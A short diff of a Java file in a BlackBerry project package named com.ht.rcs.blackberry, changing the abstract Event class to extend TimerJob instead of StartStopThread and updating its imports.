@@ -11,16 +11,16 @@ import net.rim.device.api.system.Application;
 
 import com.ht.rcs.blackberry.Status;
 import com.ht.rcs.blackberry.action.Action;
+import com.ht.rcs.blackberry.threadpool.TimerJob;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.StartStopThread;
 import com.ht.rcs.blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class Event.
  */
-public abstract class Event extends StartStopThread {
+public abstract class Event extends TimerJob {
 
     /** The debug instance. */
 	//#debug
